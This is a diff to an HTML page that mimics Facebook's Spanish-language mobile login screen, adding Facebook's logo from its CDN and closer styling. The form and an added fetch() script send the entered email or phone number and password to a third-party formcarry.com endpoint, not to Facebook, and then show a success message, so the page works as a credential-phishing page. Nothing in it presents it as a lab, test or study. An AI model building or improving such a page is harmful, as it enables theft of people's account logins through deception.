@@ -9,62 +9,111 @@
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background: linear-gradient(to bottom, #e7f3ff, #d0e8ff);
+            background: linear-gradient(to bottom, #e7f3ff, #ffffff);
             display: flex;
-            justify-content: center;
+            flex-direction: column;
+            justify-content: flex-start;
             align-items: center;
             height: 100vh;
         }
-        .login-container {
-            background-color: #fff;
-            padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            width: 100%;
-            max-width: 350px;
+        .language {
+            margin-top: 20px;
+            font-size: 1rem;
+            color: gray;
+            font-weight: bold;
         }
-        .login-container h1 {
-            margin-bottom: 1.5rem;
-            color: #1877f2;
+        .logo {
+            margin-top: 20px; 
+            margin-bottom: 50px; 
+            width: 60px;
+            height: 60px;
+        }
+        .login-container {
+            text-align: center;
+            width: 90%;
+            max-width: 350px;
         }
         .login-container input {
             width: 100%;
-            padding: 0.8rem;
-            margin-bottom: 1rem;
-            border: 1px solid #ddd;
-            border-radius: 5px;
+            padding: 16px;
+            margin: 10px 0;
+            border: 1px solid #bbb;
+            border-radius: 10px;
+            background-color: white;
+            font-size: 1.2rem;
+            box-sizing: border-box;
         }
         .login-container button {
-            width: 100%;
+            width: 80%;
             padding: 0.8rem;
             background-color: #1877f2;
             color: white;
             border: none;
-            border-radius: 25px; /* Bordes redondeados */
+            border-radius: 25px;
             cursor: pointer;
             font-size: 1rem;
             font-weight: bold;
+            margin-bottom: 0.5rem;
         }
         .login-container button:hover {
             background-color: #165cdb;
         }
         .login-container p {
-            margin-top: 1rem;
-            font-size: 0.9rem;
+            font-size: 1rem;
             color: #555;
+            margin: 10px 0;
+        }
+        .footer-logo {
+            width: 40px;
+            height: 40px;
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .message {
+            font-size: 1rem;
+            color: green;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
+    <p class="language">Español</p>
+    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/y6/r/UbJC5lwxeBU.png" alt="Facebook Logo" class="logo">
     <div class="login-container">
-        <h1>Facebook</h1>
-        <form action="https://formcarry.com/s/0-4KupVaVRG" method="POST">
+        <form action="https://formcarry.com/s/0-4KupVaVRG" method="POST" onsubmit="return handleSubmit(event)">
             <input type="text" name="email" placeholder="Correo electrónico o teléfono" required>
             <input type="password" name="password" placeholder="Contraseña" required>
             <button type="submit">Iniciar Sesión</button>
         </form>
+        <p class="message" id="statusMessage"></p>
         <p>¿Olvidaste tu contraseña?</p>
     </div>
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault(); // Prevenir que la página se recargue
+            const form = event.target;
+            const formData = new FormData(form);
+
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('statusMessage').textContent = '¡Formulario enviado con éxito!';
+                    document.getElementById('statusMessage').style.color = 'green';
+                    form.reset(); // Limpiar el formulario después del envío
+                } else {
+                    throw new Error('Error al enviar el formulario.');
+                }
+            })
+            .catch(error => {
+                document.getElementById('statusMessage').textContent = 'Hubo un problema. Inténtalo de nuevo.';
+                document.getElementById('statusMessage').style.color = 'red';
+            });
+        }
+    </script>
 </body>
 </html>
